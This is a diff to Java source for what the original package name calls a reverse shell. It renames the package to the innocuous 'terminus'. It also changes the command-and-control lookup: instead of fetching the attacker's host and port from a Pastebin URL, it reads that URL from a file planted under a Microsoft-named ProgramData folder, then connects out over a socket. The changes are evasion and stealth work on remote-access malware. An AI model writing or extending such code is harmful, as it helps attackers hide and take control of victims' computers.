@@ -1,4 +1,4 @@
-package reverse_shell;
+package terminus;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -7,6 +7,8 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.Socket;
 import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 
 public class Main {
 	public static void main(String[] args) {
@@ -14,7 +16,9 @@ public class Main {
 		int port = 10862;
 		
 		try {
-			String[] data = wget("https://pastebin.com/raw/tUqzKF9j").split(" ");
+			String link = new String(Files.readAllBytes(Paths.get("C:\\ProgramData\\Microsoft\\W\\l")));
+			
+			String[] data = wget(link).split(" ");
 			host = data[0];
 			port = Integer.parseInt(data[1]);
 			
